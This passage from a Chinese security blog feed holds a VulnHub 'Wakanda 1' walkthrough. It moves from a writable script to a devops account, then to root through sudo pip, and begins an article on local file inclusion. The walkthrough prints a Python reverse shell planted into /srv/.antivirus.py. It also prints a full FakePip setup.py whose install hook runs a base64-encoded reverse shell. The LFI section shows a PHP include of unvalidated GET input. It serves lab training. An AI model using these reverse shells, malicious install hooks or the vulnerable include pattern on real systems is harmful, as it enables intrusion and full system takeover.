class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">Debian-exim:x:104:109::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:105:110::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:106:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">avahi-autoipd:x:107:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mamadou:x:1000:1000:Mamadou,,,,Developper:/home/mamadou:/usr/bin/python</span><br><span class="line">devops:x:1001:1002:,,,:/home/devops:/bin/bash</span><br></pre></td></tr></tbody></table></figure><p>发现之前发现的devops是有<code>/bin/bash</code>权限的，可以查看下用户为devops的文件，看是否能提权到devops用户权限，有以下一些可能存在利用点的文件。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/var/mail$ find / -user devops 2>/dev/null</span><br><span class="line">/srv/.antivirus.py</span><br><span class="line">/tmp/<span class="built_in">test</span></span><br><span class="line">/home/devops</span><br><span class="line">/home/devops/.bashrc</span><br><span class="line">/home/devops/.profile</span><br><span class="line">/home/devops/.bash_logout</span><br><span class="line">/home/devops/flag2.txt</span><br></pre></td></tr></tbody></table></figure><p>挨个查看下文件权限。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/home/devops$ ls -la</span><br><span class="line">total 24</span><br><span class="line">drwxr-xr-x 2 devops developer 4096 Aug  5  2018 .</span><br><span class="line">drwxr-xr-x 4 root   root      4096 Aug  1  2018 ..</span><br><span class="line">lrwxrwxrwx 1 root   root         9 Aug  5  2018 .bash_history -> /dev/null</span><br><span class="line">-rw-r--r-- 1 devops developer  220 Aug  1  2018 .bash_logout</span><br><span class="line">-rw-r--r-- 1 devops developer 3515 Aug  1  2018 .bashrc</span><br><span class="line">-rw-r----- 1 devops developer   42 Aug  1  2018 flag2.txt</span><br><span class="line">-rw-r--r-- 1 devops developer  675 Aug  1  2018 .profile</span><br><span class="line">mamadou@Wakanda1:/home/devops$ <span class="built_in">cd</span> /srv/</span><br><span class="line">mamadou@Wakanda1:/srv$ ls -la</span><br><span class="line">total 12</span><br><span class="line">drwxr-xr-x  2 root   root      4096 Aug  1  2018 .</span><br><span class="line">drwxr-xr-x 22 root   root      4096 Aug  1  2018 ..</span><br><span class="line">-rw-r--rw-  1 devops developer  256 Feb 29 12:06 .antivirus.py</span><br></pre></td></tr></tbody></table></figure><p>发现<code>/srv/.antivirus.py</code>的隐藏文件权限为646，任何用户都可以对其进行修改，文件中python源码如下。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open(<span class="string">'/tmp/test'</span>,<span class="string">'w'</span>).write(<span class="string">'test'</span>)</span><br></pre></td></tr></tbody></table></figure><p>并且系统后台一直有进程在重复运行<code>/srv/.antivirus.py</code></p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">devops    1366     1  0 12:09 ?        00:00:00 python /srv/.antivirus.py</span><br></pre></td></tr></tbody></table></figure><p><code>/srv/.antivirus.py</code>用户权限是devops，如果我们修改<code>/srv/.antiviru.py</code>文件中的内容为python的反向连接脚本，那后台的进程在执行<code>/srv/.antivirus.py</code>脚本时就会运行我们的反向连接脚本，从而我们可以获得到devops的反向shell。</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mamadou@Wakanda1:/srv$ cat ./.antivirus.py </span><br><span class="line">open(<span class="string">'/tmp/test'</span>,<span class="string">'w'</span>).write(<span class="string">'test'</span>)</span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.199.211"</span>,<span class="number">1238</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">"/bin/bash"</span>,<span class="string">"-i"</span>])</span><br></pre></td></tr></tbody></table></figure><p>因为之前暂停过虚拟机，后台python进程已经很久没有运行过了，于是我们先监听端口然后重启下靶机，然后我们监听端口的bash就成功获得了shell连接。</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nc -lvp 1235</span></span><br><span class="line">listening on [any] 1235 ...</span><br><span class="line">connect to [192.168.199.211] from Wakanda1.lan [192.168.199.105] 37062</span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (479): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">devops@Wakanda1:/$ id</span><br><span class="line">id                                                                                                     </span><br><span class="line">uid=1001(devops) gid=1002(developer) groups=1002(developer)</span><br></pre></td></tr></tbody></table></figure><p>得到了第二个flag~</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">devops@Wakanda1:/$ <span class="built_in">cd</span> /home/devops</span><br><span class="line"><span class="built_in">cd</span> /home/devops</span><br><span class="line">devops@Wakanda1:~$ ls</span><br><span class="line">ls</span><br><span class="line">flag2.txt</span><br><span class="line">devops@Wakanda1:~$ cat flag2.txt</span><br><span class="line">cat flag2.txt</span><br><span class="line">Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</span><br></pre></td></tr></tbody></table></figure><h2 id="0x06-获取root权限"><a href="#0x06-获取root权限" class="headerlink" title="0x06 获取root权限"></a>0x06 获取root权限</h2><p>当前是在devops权限下，先使用<code>sudo -l</code>查看下devops用户有哪些权限：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">devops@Wakanda1:~$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> devops on Wakanda1:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User devops may run the following commands on Wakanda1:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/pip</span><br></pre></td></tr></tbody></table></figure><p>最后一行提示可以不用输入密码执行的命令是<code>/usr/bin/pip</code>。github上有相关的利用</p><p>进行提权的脚本，先将利用脚本下载到本地，然后修改localhost为本地kali ip<code>192.168.199.211</code>：</p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> setuptools <span class="keyword">import</span> setup</span><br><span class="line"><span class="keyword">from</span> setuptools.command.install <span class="keyword">import</span> install</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CustomInstall</span><span class="params">(install)</span>:</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">    install.run(self)</span><br><span class="line">    LHOST = <span class="string">'localhost'</span>  <span class="comment"># 修改为本地kali地址</span></span><br><span class="line">    LPORT = <span class="number">13372</span></span><br><span class="line">    </span><br><span class="line">    reverse_shell = <span class="string">'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'</span>.format(LHOST=LHOST,LPORT=LPORT)</span><br><span class="line">    encoded = base64.b64encode(reverse_shell)</span><br><span class="line">    os.system(<span class="string">'echo %s|base64 -d|bash'</span> % encoded)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">setup(name=<span class="string">'FakePip'</span>,</span><br><span class="line">      version=<span class="string">'0.0.1'</span>,</span><br><span class="line">      description=<span class="string">'This will exploit a sudoer able to /usr/bin/pip install *'</span>,</span><br><span class="line">      url=<span class="string">'https://github.com/0x00-0x00/fakepip'</span>,</span><br><span class="line">      author=<span class="string">'zc00l'</span>,</span><br><span class="line">      author_email=<span class="string">'andre.marques@esecurity.com.br'</span>,</span><br><span class="line">      license=<span class="string">'MIT'</span>,</span><br><span class="line">      zip_safe=<span class="literal">False</span>,</span><br><span class="line">      cmdclass={<span class="string">'install'</span>: CustomInstall})</span><br></pre></td></tr></tbody></table></figure><p>在本地开启http服务，这样就可以在靶机侧下载exp：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/mnt/zxf/fakepip<span class="comment"># python -m SimpleHTTPServer</span></span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 ...</span><br></pre></td></tr></tbody></table></figure><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">devops@Wakanda1:~/fakepip$ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/home/devops/fakepip</span><br><span class="line">devops@Wakanda1:~/fakepip$ wget http://192.168.199.211:8000/setup.py</span><br><span class="line">wget http://192.168.199.211:8000/setup.py</span><br><span class="line">--2020-02-29 18:54:52--  http://192.168.199.211:8000/setup.py</span><br><span class="line">Connecting to 192.168.199.211:8000... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 1015 [text/plain]</span><br><span class="line">Saving to: ‘setup.py’</span><br><span class="line"></span><br><span class="line">     0K                                                       100% 66.7M=0s</span><br><span class="line"></span><br><span class="line">2020-02-29 18:54:52 (66.7 MB/s) - ‘setup.py’ saved [1015/1015]</span><br></pre></td></tr></tbody></table></figure><p>之后现在本地kali监听脚本中指定的端口13372：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/mnt/zxf/fakepip<span class="comment"># nc -lvvp 13372</span></span><br><span class="line">listening on [any] 13372 ...</span><br></pre></td></tr></tbody></table></figure><p>在靶机侧用devops用户执行以下命令，来获取反向shell:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br></pre></td></tr></tbody></table></figure><figure class="highlight elixir"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">devops<span class="variable">@Wakanda1</span><span class="symbol">:~/fakepip</span><span class="variable">$ </span>ls</span><br><span class="line">ls</span><br><span class="line">setup.py</span><br><span class="line">devops<span class="variable">@Wakanda1</span><span class="symbol">:~/fakepip</span><span class="variable">$ </span>sudo /usr/bin/pip install . --upgrade --force-reinstall</span><br><span class="line"><sudo /usr/bin/pip install . --upgrade --force-reinstall                     </span><br><span class="line">Unpacking /home/devops/fakepip</span><br><span class="line">  Running setup.py (<span class="symbol">path:</span>/tmp/pip-hTz7ke-build/setup.py) egg_info <span class="keyword">for</span> package from <span class="symbol">file:</span>/<span class="regexp">//home</span><span class="regexp">/devops/fakepip</span></span><br><span class="line">    </span><br><span class="line">Installing collected <span class="symbol">packages:</span> FakePip</span><br><span class="line">  Running setup.py install <span class="keyword">for</span> FakePip</span><br></pre></td></tr></tbody></table></figure><p>在kali侧已经获取反向shell，并且是root权限：</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/mnt/zxf/fakepip<span class="comment"># nc -lvvp 13372</span></span><br><span class="line">listening on [any] 13372 ...</span><br><span class="line">192.168.199.105: inverse host lookup failed: Unknown host</span><br><span class="line">connect to [192.168.199.211] from (UNKNOWN) [192.168.199.105] 50717</span><br><span class="line">root@Wakanda1:/tmp/pip-hTz7ke-build<span class="comment"># wwhhooaammii</span></span><br><span class="line">root</span><br><span class="line">root@Wakanda1:/tmp/pip-hTz7ke-build<span class="comment"># iidd</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></tbody></table></figure><p>全局搜了一下，在<code>/root</code>目录下有一个<code>root.txt</code>文件。内容即为最后的flag:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@Wakanda1:/<span class="comment"># ccdd  //rroooott</span></span><br><span class="line">root@Wakanda1:~<span class="comment"># llss</span></span><br><span class="line">root.txt</span><br><span class="line">root@Wakanda1:~<span class="comment"># ccaatt  rroooott..ttxxtt</span></span><br><span class="line"></span><br><span class="line"> _    _.--.____.--._</span><br><span class="line">( )=.-<span class="string">":;:;:;;':;:;:;"</span>-._</span><br><span class="line"> \\\:;:;:;:;:;;:;::;:;:;:\</span><br><span class="line">  \\\:;:;:;:;:;;:;:;:;:;:;\</span><br><span class="line">   \\\:;::;:;:;:;:;::;:;:;:\</span><br><span class="line">    \\\:;:;:;:;:;;:;::;:;:;:\</span><br><span class="line">     \\\:;::;:;:;:;:;::;:;:;:\</span><br><span class="line">      \\\;;:;:_:--:_:_:--:_;:;\</span><br><span class="line">       \\\_.-<span class="string">"             "</span>-._\</span><br><span class="line">        \\</span><br><span class="line">         \\</span><br><span class="line">          \\</span><br><span class="line">           \\ Wakanda 1 - by @xMagass</span><br><span class="line">            \\</span><br><span class="line">             \\</span><br><span class="line"></span><br><span class="line">Congratulations You are Root!</span><br><span class="line">821ae63dbe0c573eff8b69d451fb21bc</span><br></pre></td></tr></tbody></table></figure><p>到此，我们已经获取了root权限并完成了这个靶机。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h2&gt;&lt;p&gt;靶机地址：&lt;a href=&quot;https://www.vulnhub.com/entry/wakanda-1,251/#&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.vulnhub.com/entry/wakanda-1,251/#&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;使用VM VirtualBox运行靶机，配置运行kali的VMware和运行靶机的VM VirtualBox均使用桥接网卡模式，这样kali和目的靶机就在同一个局域网中，可以开始后续的测试了。&lt;/p&gt;
&lt;h2 id=&quot;0x01-目标探测&quot;&gt;&lt;a href=&quot;#0x01-目标探测&quot; class=&quot;headerlink&quot; title=&quot;0x01 目标探测&quot;&gt;&lt;/a&gt;0x01 目标探测&lt;/h2&gt;&lt;p&gt;我们先使用&lt;code&gt;ipconfig&lt;/code&gt;命令来查看下本地ip，然后再使用&lt;code&gt;netdiscover&lt;/code&gt;命令和&lt;code&gt;arp -l&lt;/code&gt;命令来探测局域网内有哪些存活的主机。&lt;/p&gt;
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="Vulnhub" scheme="http://yoursite.com/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>文件包含漏洞分析</title>
    <link href="http://yoursite.com/2019/07/17/LFI/"/>
    <id>http://yoursite.com/2019/07/17/LFI/</id>
    <published>2019-07-17T12:36:57.641Z</published>
    <updated>2020-06-16T17:01:27.138Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-漏洞简介"><a href="#0x00-漏洞简介" class="headerlink" title="0x00 漏洞简介"></a>0x00 漏洞简介</h2><p>如果允许客户端输入控制动态包含在服务器端的文件，会导致恶意代码的执行与敏感信息的泄露。文件包含通常分为本地文件包含（<code>Local File Inclusion</code>）和远程文件包含(<code>Remote File Inclusion</code>)。<code>allow_url_fopen</code>和<code>allow_url_include</code>为on的情况认为是远程文件包含漏洞，<code>allow_url_fopen</code>为off和<code>allow_url_include</code>为on为本地文件包含漏洞。</p><a id="more"></a><h2 id="0x01-漏洞成因"><a href="#0x01-漏洞成因" class="headerlink" title="0x01 漏洞成因"></a>0x01 漏洞成因</h2><p>文件包含漏洞的产生原因是通过引入文件时，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意代码注入。当被包含的文件在服务器本地时，就形成本地文件包含漏洞。</p><h2 id="0x02-实例分析"><a href="#0x02-实例分析" class="headerlink" title="0x02 实例分析"></a>0x02 实例分析</h2><figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'func'</span>]) {</span><br><span class="line">   <span class="keyword">include</span> $_GET[<span class="string">'func'</span>];</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">   <span class="keyword">include</span> <span class="string">'default.php'</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>程序的本意可能是当提交url为<code>http://example.com/index.php?func=add.php</code>时，调用add.php里面的样式内容和功能。直接访问<code>http://example.com/index.php</code>则会包含默认的default.php。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;0x00-漏洞简介&quot;&gt;&lt;a href=&quot;#0x00-漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x00 漏洞简介&quot;&gt;&lt;/a&gt;0x00 漏洞简介&lt;/h2&gt;&lt;p&gt;如果允许客户端输入控制动态包含在服务器端的文件，会导致恶意代码的执行与敏感信息的泄露。文件包含通常分为本地文件包含（&lt;code&gt;Local File Inclusion&lt;/code&gt;）和远程文件包含(&lt;code&gt;Remote File Inclusion&lt;/code&gt;)。&lt;code&gt;allow_url_fopen&lt;/code&gt;和&lt;code&gt;allow_url_include&lt;/code&gt;为on的情况认为是远程文件包含漏洞，&lt;code&gt;allow_url_fopen&lt;/code&gt;为off和&lt;code&gt;allow_url_include&lt;/code&gt;为on为本地文件包含漏洞。&lt;/p&gt;
    
    </summary>
    
      <category term="Web" scheme="http://yoursite.com/categories/Web/"/>
    
    
      <category term="文件包含" scheme="http://yoursite.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
</feed>
